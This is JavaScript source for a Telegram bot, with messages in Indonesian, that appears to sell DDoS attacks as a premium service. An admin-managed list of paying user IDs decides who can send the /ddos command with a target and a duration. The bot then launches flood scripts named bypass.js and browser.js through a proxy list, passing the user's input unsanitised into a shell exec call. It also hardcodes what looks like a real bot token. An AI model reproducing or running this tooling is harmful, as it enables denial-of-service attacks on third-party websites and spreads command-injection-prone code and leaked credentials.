const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

const token = '7377776939:AAHVc0fzMMcf3bzen8fPHAJxOzYUo9mUHgc';
const bot = new TelegramBot(token, { polling: true });

const adminid = '1461603503';
let allowedUsers = [];

try {
    const data = fs.readFileSync('database.json', 'utf8');
    allowedUsers = JSON.parse(data);
} catch (error) {
    console.error('Error loading database.json:', error);
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userid = msg.from.id;
    const response = `
ID Anda: \`${userid}\`

\`\`\`CMD
Command: /start
Penjelasan: Menampilkan Menu

Command: /ddos
Penjelasan: Menjalankan source
Penggunaan: /run target.com time

Command: /addprem {id}
Penjelasan: Menambahkan ID ke database
Penggunaan: /addprem {id}

Command: /delprem {id}
Penjelasan: Menghapus ID dari database
Penggunaan: /delprem {id}\`\`\`
    `;
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown'});
});

// Command /addprem {id}
bot.onText(/\/addprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    if (msg.from.id.toString() === adminid) {
        allowedUsers.push(userId);
        fs.writeFileSync('database.json', JSON.stringify(allowedUsers));
        bot.sendMessage(chatId, `User dengan ID ${userId} berhasil ditambahkan ke database.`);
    } else {
        bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menambahkan pengguna.');
    }
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    if (msg.from.id.toString() === adminid) {
        allowedUsers = allowedUsers.filter(user => user !== userId);
        fs.writeFileSync('database.json', JSON.stringify(allowedUsers));
        bot.sendMessage(chatId, `User dengan ID ${userId} berhasil dihapus dari database.`);
    } else {
        bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menghapus pengguna.');
    }
});

bot.onText(/\/ddos (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    if (allowedUsers.includes(userId)) {
        const target = match[1];
        const time = match[2];

        const commands = [
            `node bypass.js ${target} ${time} 35 10 proxy.txt`,
            `node browser.js ${target} ${time} 10 35 proxy.txt`
        ];

        const executeCommand = (command) => {
            return new Promise((resolve, reject) => {
                exec(command, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error running ${command}: ${error}`);
                        reject(error);
                    } else if (stderr) {
                        console.error(`stderr running ${command}: ${stderr}`);
                        reject(stderr);
                    } else {
                        console.log(`stdout running ${command}: ${stdout}`);
                        resolve(stdout);
                    }
                });
            });
        };

        try {
            const results = await Promise.all(commands.map(command => executeCommand(command)));
            bot.sendMessage(chatId, `Semua perintah berhasil dijalankan: ${results.join('\n')}`);

            setTimeout(() => {
                bot.sendMessage(chatId, `Penyerangan Berhasil Dilakukan`);
            }, parseInt(time) * 1000); 
        } catch (err) {
            bot.sendMessage(chatId, `Terjadi kesalahan saat menjalankan perintah: ${err}`);
        }
    } else {
        bot.sendMessage(chatId, 'Anda tidak diizinkan untuk menjalankan perintah ini.');
    }
});


bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const message = msg.text.toString();
    if (!message.startsWith('/')) {
        bot.sendMessage(chatId, 'Perintah tidak dikenali. Silakan gunakan perintah yang benar.');
    }
});
